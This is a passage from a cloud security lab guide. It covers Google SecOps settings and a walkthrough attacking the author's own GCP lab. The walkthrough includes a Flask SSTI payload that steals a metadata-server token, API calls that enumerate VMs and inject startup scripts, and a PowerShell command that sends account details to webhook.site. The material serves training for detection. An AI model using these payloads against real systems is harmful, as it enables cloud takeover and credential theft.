- ⚠️ If you get an error message that says that you are missing the ping action from Siemplify (or something similar), go to the Marketplace and validate that you have the installed the Siemplify integration.
```

**Develop Custom automated workflows with Google SecOps SOAR**

```diff
- ⚠️ This part of the lab will be added in the future.
```

**Create a custom dashboard**

```diff
- ⚠️ This part of the lab will be added in the future.
```

**Develop Custom YARA-L Detection Rules**

Based on your lab, focus on detecting:
- Suspicious PowerShell or WMI execution
- Local Administrator enumeration from WS
- Unusual authentication locations to the WS
- SPN brute-force attempts (Kerberoasting indicators)
- Access to Description field of AD accounts
- HTTP access to /preview?name= with SSTI payloads

**Finetune Google SecOps Configurations**

This part of the lab is more theoretical than practical. In this part of the lab you will learn how to manage and configure your Google SecOps.

First of all, it is very important to know that there are two main settings in Google SecOps, and neither of them affect the others: SIEM Settings and SOAR settings. This is particular true with the **Access Control** settings. You will notice that the platform allows you grant **Administrator** access both to the SIEM, but also for the SOAR. These are distinct administrator roles.

This section will emphasize more on the SOAR settings, since SIEM settings were already touched several times in earlier sections and are also very well documented (I'll update the documentation to include SIEM settings in-depth in the future). Particularly the environment specific settings.

Go to **Settings > SOAR Settings** and inspect the grouped settings that appear in the left sidebar. On of the most important settigns is **Organization > Environments**. Here, we can define our different contexts. I created an environment named `secops-scc-lab`. This setting is just visual, but helps keep every alert organized and clean.

```diff
- ⚠️ If you decided to create an envrionment as well, you will need to update your SOAR integrations.
```

Under **Case Data** you can set up various parameters that can help you tailor the views of the Google SecOps cases. For instance, you can add a **Tag** that includes the word `Windows` in every case that contains a Windows computer involved.

Under **Environments** you can tailor the details of each of the environments you created under **Organization > Environments**. For example, in this laboratory, we have two networks involved: `172.16.1.0/24` is the VNET in Azure, and `172.16.0.0/24` is the VPC in GCP. This is important information that we can add in the **Networks** settings.

Explore the remaining settings just to have a clear understanding of what you can move.

## Happy Hacking!

The goal is to simulate three common cloud attack vectors leading to domain compromise or cloud console takeover, and to practice detection/response for each. For the detection guide, go to [Happy Detection!](#happy-detection) section. 

Ultimately, an attacker in the lab could achieve one or more of the following objectives:

1. **Active Directory compromise** – e.g. obtaining credentials or sensitive data from AD via the RODC.
2. **Data exfiltration** – stealing sensitive information from the RODC or from a vulnerable application’s database.
3. **Cloud console takeover** – abusing GCP credentials or misconfigurations to gain control of the GCP project resources.

You may want to review the following resources, as they provide information on the kind of attacks we are going to pursue, as well as the detection mechanisms recommended for each technique.
- The Cyber Mentor's YouTube video [Hacking Active Directory for Beginners (over 5 hours of content!)](https://www.youtube.com/watch?v=VXxH4n684HE&t=2594s) demonstrates interesting Active Directory tactics and techniques that you can pursue in the Windows Domain lab that we set up, which is again inspired in [Kamran Bilgrami's post](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f).
- You can read the [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821) and [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory](https://adsecurity.org/?p=3592) to learn more about other specific tactics and techniques for Active Directory.
- Regarding the vulnerability of the Web Application we deployed in **Cloud Run**, you might want to read about [Server Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection). You can learn more about this technique in this [OWASP page about SSTI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)

### Adversary Scenario 1: Access Token Abuse for Cloud Resource Discovery via Metadata API

In this scenario you will:
1. Obtain and used a valid bearer token tied to a Google Cloud service account ([T1078.004: Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)) for **Initial Access**.
2. Enumerate Compute Engine VM details, service account scopes, and public metadata via API ([T1526: Cloud Service Discovery](https://attack.mitre.org/techniques/T1526/)) for **Discovery**.
4. Create a user account in a VM by injecting metadata through a API ([T1098.003](https://attack.mitre.org/techniques/T1098/003/)) to gain **Persistance**.

**Discover a vulnerable web application**

In this part of the scenario you must discover the vulnerable application first (assuming you know nothing about it, nor the vulnerability it has). You might have wondered once (or many times), How do adversaries and hackers discover vulnerable applications and vulnerable instances in the cloud?

Often, in CTFs and in cybersecurity labs, we skip the [reconnaissance phase](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) that is a crucial part of every targeted cyberattack. Adversaries might attempt several techniques to discover vulnerable and accessible applications and cloud resources:

1. Scanning Public IP Addresses Ranges
2. Exploiting Misconfigured Cloud Services
3. Using Compromised Credentials and Publicly Available Information
4. Leveraging the Cloud Instance Metadata API
5. Using Cloud Service Discovery Tools
6. Identifying Internet Connection

Suppose that you want to discover vulnerable applications running in Google Cloud. How would you do it? One way would be to scan public IPv4 addresses that belong to Google Cloud and search for subdomains related to Google Cloud Instances. For instance, Cloud Run applications, by default, are deployed under the domain `run.app`. For this task, you can use **Shodan**, for example.

You might want to try find your own application using **Google Dorking** techniques and IP scanners.

```diff
- ⚠️ Keep in mind that your application can be quite difficult to locate in the wild since it was created very recently.
```

**Initial Access: Exploiting a vulnerability in a web application**

```diff
+ ✅ You may not know what vulnerability has the web application. If that's your case (either because somededy else built the lab for you, or because you didn't read the source code of the app), don't read this section and try to exploit the web app yourself!
```

How would you discover a web vulnerability. The vulnerable application included in this lab is quite easy to exploit, since it is just a bunch of HTML and Python code, which might recall you of a very common framework used by developers (**Flask**). You as the adversary might not know that, but you can assume it.

Flask allows developers to render HTML programatically. This, for web development, is just amazing. Similarly, for black hat hackers, this is the saint grail. One of the most common vulnerabilities of web applications that use server side templating technologies occur when (bad) developers handle user input in a template in an unsafe manner, resulting in remote code execution on the backend. This is called [Server Side Template Injection (SSTI)](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection), and it is the vulnerability that the web application has.

Now, in order to exploit our cloud infrastructure, we need two things: Pentesting skills and Google Cloud API knowledge, or at least, now how to search.

The first step is to play with the app. Be legitimate. You want to know how the application behaves under normal conditions.

![](/src/images/scc-secops-lab/68-misc-testing_vuln_app_behavior.png)

The application is really simple, so you will notice right-away that the **Name** user input field is being replicated in the URL and the HTML code of the redirection page. Since the user input appears in the URL, you would like to try what happen if you change the value to something else.

![](/src/images/scc-secops-lab/69-misc-testing_vuln_app_behavior2.png)

Notice that changing the value of the URI parameter **name** is "rendered" in the webpage. 

Now that we know how the application operates, we shuold start trying some hacking techniques. We already know that the vulnerability of this web app is SSTI. This is what OWASP says about how to detect this vulnerability:

> [...] Construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.

For Flask, template expressions are defined by enclosing python code in between two nested brackets, like `{{ 7 * 7 }}`. Try replacing this in the URL.

![](/src/images/scc-secops-lab/70-misc-testing_vuln_app_behavior3_vuln_detected_ssti.png)

We found our vulnerability. The rest is just knowing a little bit of Python and the GCP API. Try replacing the following injection code in the URL.

```python
config.__class__.__init__.__globals__['os'].popen("curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'").read()
```

![](/src/images/scc-secops-lab/71-misc-vuln_app_ssti_get_token.png)

**Discovery: Get information of the cloud environment**

1. **Get information of the token**
```bash
export BEARER_TOKEN="<Exfiltrated Token>"

curl -H "Authorization: Bearer $BEARER_TOKEN" \
    https://oauth2.googleapis.com/tokeninfo
```

This call is very important because it will give you all the information about our token. This includes the scopes, the expiration time, but most importantly, the email account associated to this token.

If this token is associated to a real person we would normaly start preparing our phishing campaign. However, in this scenario, the token is associated with a service account (which is expected, because the token was granted by a Cloud Run application). 

The problem here is that the email account is the default GCP Compute Engine Developer account, which includes in its name the **project number**. A value that we can use just like the GCP project id. 

Below is an example output of the API command we just run.

```bash
{
  "azp": "012345678901234567890",
  "aud": "012345678901234567890",
  "scope": "https://www.googleapis.com/auth/cloud-platform [ommited]",
  "exp": "1753158715",
  "expires_in": "979",
  "email": "362514745896-compute@developer.gserviceaccount.com",
  "email_verified": "true",
  "access_type": "online"
}

# Export the project id that is embedded in the default service account email
export $PROJECT_ID="362514745896"
```

2. **List All VMs in the Project**
```bash
curl -H "Authorization: Bearer $BEARER_TOKEN" \
    https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/aggregated/instances

# Export the instance name, zone, and fingerprint
export INSTANCE_NAME="rodc-ajrc-local"
export ZONE="us-east1-d"
```

3. **Get metadata of a specific VM**
```bash
curl -H "Authorization: Bearer $BEARER_TOKEN" \
     "https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/zones/$ZONE/instances/$INSTANCE_NAME"

export FINGERPRINT="Pol5p_ogKXQ="
```

Notice that you want to extract the `metadata.fingerprint` value. GCP requires the exact current fingerprint when setting metadata to ensure you're updating the correct version. If you use the wrong one, you'll get a `412 Precondition Failed` error.

Below is a simplified sample output of this command.

```bash
{
  "kind": "compute#instance",
  "id": "4583243601304432596",
  "creationTimestamp": "2025-07-16T22:59:23.750-07:00",
  "name": "rodc-ajrc-local",    # INSTANCE NAME
  "description": "",
  "tags": { "fingerprint": "42WmSpB8rSM=" },
  "machineType": "https://www.googleapis.com/compute/v1/projects/secops-scc-lab/zones/us-east1-d/machineTypes/e2-medium",
  "status": "RUNNING",
  "zone": "https://www.googleapis.com/compute/v1/projects/secops-scc-lab/zones/us-east1-d",
  "canIpForward": false,
  "metadata": {
    "kind": "compute#metadata",
    "fingerprint": "alsSqal8dOY=",  # FINGERPRINT
    "items": [
      {
        "key": "startup-script",
        "value": "net user attacker P@ssw0rd123 /add && net localgroup administrators attacker /add"
      }
    ]
  },
  "fingerprint": "0jINdcllz8Q="
}
```

```diff
+ ✅ You can try manage and move other configurations like firewall/network tags (tags.fingerprint) and instance labels (labelFingerprint). Can you find other ways to gain access or perform your goal?
```

**Persistance: Get remote access by Injecting metadata Using Leaked Cloud Token**

You can try insert a [start up script](https://cloud.google.com/compute/docs/metadata/overview#startup_and_shutdown_scripts) in the VM and perform some kind of operation.

Since this is a Read-only DC (We only know that because of the VM hostname), we know in advance that write operations are forbidden. Thus, our goal is to exfiltrate enough information to get access via a valid account.

```bash
# Change $REMOTE_HTTP_SERVER and $COMMAND manually.

curl -X POST -H "Authorization: Bearer $BEARER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "fingerprint": "$FINGERPRINT",
       "items": [
         {
           "key": "windows-startup-script-ps1",
           "value": "Invoke-WebRequest -Uri "$REMOTE_HTTP_SERVER" -Method POST -Body $COMMAND"
         }
       ]
     }' \
     "https://compute.googleapis.com/compute/v1/projects/742540562663/zones/$ZONE/instances/$INSTANCE/setMetadata"
```

One method to exfiltrate data easily is to try the `net user` command. But how can you receive the information? As explained in [this reddit post](https://www.reddit.com/r/hacking/comments/1e1nrgv/how_do_hackers_go_about_transferring_huge_amounts/):

> "Security teams focus a LOT of time securing inbound attacks, but often have blanket rules allowing outbound traffic [...]."

Which is true in our environment. We only need a server in the wild listening for requests. We can use [Webhook.site](https://webhook.site), which is a tool used by developers. However, adversaries can use it as a remtoe repository for data exfiltration.

Assumming that you injected the `net user` command first and discovered that the windows domain has a user `sql_service` (which you may recall, has its password in the resource description), this will be your next injection command:

```PowerShell
Start-Sleep -Seconds 60; Invoke-WebRequest -Uri "https://webhook.site/{your-token}" -UseBasicParsing -Method POST -Body $(net user sql_service)
```

![](/src/images/scc-secops-lab/72-misc-rodc_net_user_outbound_exfil.png)

Notice that the injected command has a delay of one minute. This is because the startup scritps run too early during the boot proces, specifically before the Local Security Authority Subsystem Service (LSASS) and the IE COM engine (Internet Explorer).

You can read more about startup scripts in [Use startup scripts on Windows VMs](https://cloud.google.com/compute/docs/instances/startup-scripts/windows). Try to build your own initial access script in a different way.

**Final considerations**

For our lab this is fantastic. You can now login to the Windows domain remotely using the **SQL Service** account credentials (which you may recall, has admin privileges).

In a real world attack, adversaries will not (or shouldn't?) be that silly. Loging in with a service account remotely is a big red flag!

Additionally, the script we ran earlier is quite noisy. Organizations with powershell monitoring will detect that kind of behavior.

Finally, notice that the whole attack path was possible just because we were able to gather an authentication token. Accounts mananging applications deployed in cloud instances must be carefully evaluated (Never leave default accounts).

Take a look at section [Scenario 1: Detect Forbidden or Abnormal Usage of GCP API](#scenario-1-detect-forbidden-or-abnormal-usage-of-gcp-api) to get more information about detection and prevention  mechanisms with Google SecOps and Google Security Command Center for this technique.

## Happy Detection!

### Scenario 1: Detect Forbidden or Abnormal Usage of GCP API

TODO
